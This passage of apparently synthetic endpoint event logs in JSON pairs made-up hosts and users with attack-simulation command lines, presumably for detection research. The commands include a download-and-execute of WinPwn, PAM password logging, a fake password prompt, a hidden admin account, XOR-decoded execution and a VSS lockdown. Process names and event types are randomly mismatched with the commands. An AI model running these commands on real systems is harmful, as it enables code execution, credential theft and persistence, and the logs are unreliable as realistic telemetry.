        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\noldchecks -noninteractive -consoleoutput\",",
        "LogonID": 516300,
        "LogonGuid": "0d1bd3f4-a573-4153-b3a1-3e06dac7ad07",
        "SourceProcessID": 4199,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\month..exe",
        "DestinationProcessID": 8917,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\six..exe",
        "UtcTime": "2024-05-17T01:36:51.672618Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-12.fields-kemp.info",
        "User": "kelly68",
        "ProcessID": 9344,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=organizationalUnit) #{optional_args}\\n\",",
        "LogonID": 881528,
        "LogonGuid": "4c8f2cc3-8557-4aad-a26e-2ed86017f697",
        "SourceProcessID": 5086,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\story..exe",
        "DestinationProcessID": 7415,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\nice..exe",
        "UtcTime": "2024-05-17T01:36:51.672618Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-76.lee.com",
        "User": "landrykaren",
        "ProcessID": 8932,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"copy-item \\\"$env:windir\\\\System32\\\\cmd.exe\\\" -destination \\\"$env:allusersprofile\\\\cmd.exe\\\"\\nstart-process \\\"$env:allusersprofile\\\\cmd.exe\\\"\\nsleep -s 5 \\nstop-process -name \\\"cmd\\\" | out-null\",",
        "LogonID": 621495,
        "LogonGuid": "1d079e03-c6e1-4a72-aab5-dcc7fbe190e3",
        "SourceProcessID": 9571,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\collection..dll",
        "DestinationProcessID": 2903,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\watch..dll",
        "UtcTime": "2024-05-17T01:36:51.672618Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-83.adams-williams.com",
        "User": "huntervalerie",
        "ProcessID": 6625,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-LocalUser -Name \\\"Administrator \\\" -NoPassword\",",
        "LogonID": 448973,
        "LogonGuid": "d73fc6e0-da1a-443c-8055-fd1dd7e03ea3",
        "SourceProcessID": 4589,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\factor..exe",
        "DestinationProcessID": 6432,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\collection..dll",
        "UtcTime": "2024-05-17T01:36:51.672618Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-81.rodriguez-baker.com",
        "User": "marymedina",
        "ProcessID": 3158,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$TokenSet = @{\\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\\n  N = [Char[]]'0123456789'\\n}\\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\\n$StringSet = $Upper + $Number\\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\\n$file = \\\"rad\\\" + $rad + \\\".tmp\\\"\\n\\nwhoami.exe /all >> #{output_path}\\\\$file\\n\",",
        "LogonID": 817097,
        "LogonGuid": "cc4643cd-6f14-4d4d-8c9f-6fed82c765f4",
        "SourceProcessID": 5116,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\bag..exe",
        "DestinationProcessID": 1009,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\far..exe",
        "UtcTime": "2024-05-17T01:36:51.672618Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-25.thompson.com",
        "User": "mstark",
        "ProcessID": 7643,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\\nsudo touch /tmp/password-auth.bk\\nsudo touch /tmp/system-auth.bk sudo echo \\\"session    required    pam_tty_audit.so\\nenable=* log_password\\\" >> /etc/pam.d/password-auth sudo echo \\\"session    required    pam_tty_audit.so\\nenable=* log_password\\\" >> /etc/pam.d/system-auth\\n\",",
        "LogonID": 342899,
        "LogonGuid": "2d91ffb4-3210-4682-9085-0313e3e97edb",
        "SourceProcessID": 5611,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\story..exe",
        "DestinationProcessID": 5705,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\similar..dll",
        "UtcTime": "2024-05-17T01:36:51.673619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-65.knight-cardenas.info",
        "User": "russoveronica",
        "ProcessID": 5834,
        "ProcessName": "malware.exe",
        "CommandLine": "\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"#{thing_to_execute}\\\"\\n\",",
        "LogonID": 464056,
        "LogonGuid": "3df3f9a0-b132-4ae7-bce8-8a3ac2be9c25",
        "SourceProcessID": 3584,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\leader..dll",
        "DestinationProcessID": 2388,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\point..exe",
        "UtcTime": "2024-05-17T01:36:51.673619Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-91.hall.com",
        "User": "michaelarcher",
        "ProcessID": 8769,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"osascript -e 'tell application \\\"Finder\\\" to delete POSIX file \\\"#{system_log_path}\\\"'\\n\",",
        "LogonID": 314800,
        "LogonGuid": "8210a005-587a-470d-923d-cdac2285249f",
        "SourceProcessID": 2967,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\accept..exe",
        "DestinationProcessID": 1770,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\of..dll",
        "UtcTime": "2024-05-17T01:36:51.673619Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-33.gentry.com",
        "User": "qsimmons",
        "ProcessID": 4483,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$notepad = Start-Process notepad -passthru\\nStart-Process \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\InjectView.exe\\\"\\n\",",
        "LogonID": 805981,
        "LogonGuid": "e89e0175-cff5-4eaf-aa59-16122f70d767",
        "SourceProcessID": 3163,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\office..dll",
        "DestinationProcessID": 5209,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\sit..dll",
        "UtcTime": "2024-05-17T01:36:51.673619Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-54.shannon-small.net",
        "User": "ortiztimothy",
        "ProcessID": 8787,
        "ProcessName": "nc.exe",
        "CommandLine": "\"osascript -e 'tell app \\\"System Preferences\\\" to activate' -e 'tell app \\\"System Preferences\\\" to activate' -e 'tell app \\\"System Preferences\\\" to display dialog \\\"Software Update requires that you type your password to apply changes.\\\" & return & return  default answer \\\"\\\" with icon 1 with hidden answer with title \\\"Software Update\\\"'\\n\",",
        "LogonID": 994076,
        "LogonGuid": "eac847a3-47e0-4792-a536-48d5edd2a011",
        "SourceProcessID": 2257,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\front..dll",
        "DestinationProcessID": 1233,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\take..dll",
        "UtcTime": "2024-05-17T01:36:51.674618Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-27.chavez-young.com",
        "User": "lhernandez",
        "ProcessID": 4107,
        "ProcessName": "malware.exe",
        "CommandLine": "\"tcpdump -c 5 -nnni #{interface}\\ntshark -c 5 -i #{interface}\\n\",",
        "LogonID": 509820,
        "LogonGuid": "2a749fe7-9b4b-4741-bf50-1e9d1e13c0e6",
        "SourceProcessID": 9550,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\quickly..dll",
        "DestinationProcessID": 7463,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\into..dll",
        "UtcTime": "2024-05-17T01:36:51.674618Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-49.dunlap.net",
        "User": "william36",
        "ProcessID": 9763,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"pw useradd art -g wheel -s /bin/sh\\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\\npw lock art\\npw usermod art -e +1d\\npw unlock art\\npw user mod art -e +99d\\nsu art\\nwhoami\\nexit\\n\",",
        "LogonID": 187666,
        "LogonGuid": "a6548107-032e-47f2-b63f-aacbb4f54b15",
        "SourceProcessID": 2514,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\himself..exe",
        "DestinationProcessID": 5694,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\current..dll",
        "UtcTime": "2024-05-17T01:36:51.674618Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-32.cooper.com",
        "User": "sboyer",
        "ProcessID": 5820,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Invoke-WebRequest -OutFile C:\\\\Users\\\\$env:username\\\\Desktop\\\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\\n$file1 = \\\"C:\\\\Users\\\\\\\" + $env:username + \\\"\\\\Desktop\\\\TeamViewer_Setup.exe\\\"\\nStart-Process -Wait $file1 /S; \\nStart-Process 'C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer.exe'\\n\",",
        "LogonID": 154963,
        "LogonGuid": "3167ac36-f5b2-4a9f-8615-5ff08a8c7201",
        "SourceProcessID": 3974,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\house..dll",
        "DestinationProcessID": 5742,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\answer..exe",
        "UtcTime": "2024-05-17T01:36:51.674618Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-34.gomez-sanchez.com",
        "User": "sherrythomas",
        "ProcessID": 7747,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"\\\"#{uacme_exe}\\\"\\n\",",
        "LogonID": 690796,
        "LogonGuid": "eb148dff-74ed-4db6-8064-3d970a0d149d",
        "SourceProcessID": 7601,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\myself..exe",
        "DestinationProcessID": 7112,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\technology..exe",
        "UtcTime": "2024-05-17T01:36:51.675622Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-50.waters.info",
        "User": "ashleeflores",
        "ProcessID": 1373,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"mkdir -p /var/spool/mail/copy\\nfor file in /var/spool/mail/*; do\\n  if [ \\\"$(basename \\\"$file\\\")\\\" != \\\"copy\\\" ]\\n  then\\n    cp -R \\\"$file\\\" /var/spool/mail/copy/\\n  fi\\ndone\\nrm -rf /var/spool/mail/copy/*\\n\",",
        "LogonID": 251799,
        "LogonGuid": "dcac379e-1715-485d-b7e3-a9e7b9d07f8c",
        "SourceProcessID": 8110,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\program..exe",
        "DestinationProcessID": 1401,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\community..dll",
        "UtcTime": "2024-05-17T01:36:51.675801Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-50.sutton.com",
        "User": "xcarpenter",
        "ProcessID": 6097,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ls -recurse\\nget-childitem -recurse\\ngci -recurse\\n\",",
        "LogonID": 154345,
        "LogonGuid": "04fb13c7-d428-417a-b7f7-9a5a58abc181",
        "SourceProcessID": 4425,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\lose..exe",
        "DestinationProcessID": 3463,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\go..exe",
        "UtcTime": "2024-05-17T01:36:51.675801Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-67.white.biz",
        "User": "breweralexander",
        "ProcessID": 7848,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}\",",
        "LogonID": 132547,
        "LogonGuid": "674cf9e6-3ae5-47b6-8793-b843cce305cf",
        "SourceProcessID": 8820,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\full..exe",
        "DestinationProcessID": 7884,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\finally..exe",
        "UtcTime": "2024-05-17T01:36:51.676740Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-26.clark-ortiz.com",
        "User": "ritamatthews",
        "ProcessID": 3216,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-PSSession -ComputerName #{hostname_to_connect}\\nTest-Connection $env:COMPUTERNAME\\nSet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use -Value \\\"T1086 PowerShell Session Creation and Use\\\"\\nGet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\nRemove-Item -Force $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\n\",",
        "LogonID": 402115,
        "LogonGuid": "b280337a-2f08-4c19-b3b6-38ac221ebed6",
        "SourceProcessID": 2087,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\happy..exe",
        "DestinationProcessID": 6619,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\show..dll",
        "UtcTime": "2024-05-17T01:36:51.676740Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-45.thompson.com",
        "User": "harry19",
        "ProcessID": 8276,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:#{output_file} \\\"#{input_file}\\\"\\n\",",
        "LogonID": 437338,
        "LogonGuid": "3bfe6744-7d77-4257-b28a-af58e3b6a645",
        "SourceProcessID": 6360,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\already..dll",
        "DestinationProcessID": 3562,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\help..dll",
        "UtcTime": "2024-05-17T01:36:51.676740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-28.ferguson.com",
        "User": "coledaniel",
        "ProcessID": 4715,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"ip tcp_metrics show |grep --invert-match \\\"^127\\\\.\\\"\\n\",",
        "LogonID": 376678,
        "LogonGuid": "d3d5f628-5346-4d6f-81c8-d30e77fd4c41",
        "SourceProcessID": 2251,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\like..exe",
        "DestinationProcessID": 5118,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\yourself..exe",
        "UtcTime": "2024-05-17T01:36:51.677739Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-40.richards.net",
        "User": "coreywilson",
        "ProcessID": 1983,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"rm -rf #{folder_to_delete}\\n\",",
        "LogonID": 511787,
        "LogonGuid": "8a9731f8-f297-4f17-adfb-6d3d35432684",
        "SourceProcessID": 4309,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\so..dll",
        "DestinationProcessID": 5269,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\draw..dll",
        "UtcTime": "2024-05-17T01:36:51.677739Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-05.montoya-rangel.info",
        "User": "qduran",
        "ProcessID": 2710,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sc.exe stop #{service_name}\\n\",",
        "LogonID": 734330,
        "LogonGuid": "cb194b9f-86e1-4d31-b23f-2f1e513096ec",
        "SourceProcessID": 6923,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\house..dll",
        "DestinationProcessID": 2628,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\off..exe",
        "UtcTime": "2024-05-17T01:36:51.677739Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-34.glover.net",
        "User": "hunter56",
        "ProcessID": 4589,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \\\"\\\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \\\"#{encrypted_command}\\\"; key = \\\"#{xor_key}\\\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'\",",
        "LogonID": 741130,
        "LogonGuid": "00ae6bc8-056c-43cf-9672-7ce118c584ff",
        "SourceProcessID": 5960,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\administration..dll",
        "DestinationProcessID": 3917,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\boy..exe",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-26.young-johnson.com",
        "User": "gallegosdouglas",
        "ProcessID": 7052,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\\n\",",
        "LogonID": 408060,
        "LogonGuid": "d27ba13c-b074-4609-9c72-a85f0518bb5d",
        "SourceProcessID": 4788,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\Mr..exe",
        "DestinationProcessID": 4029,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\move..dll",
        "UtcTime": "2024-05-17T01:36:51.678740Z"
    },
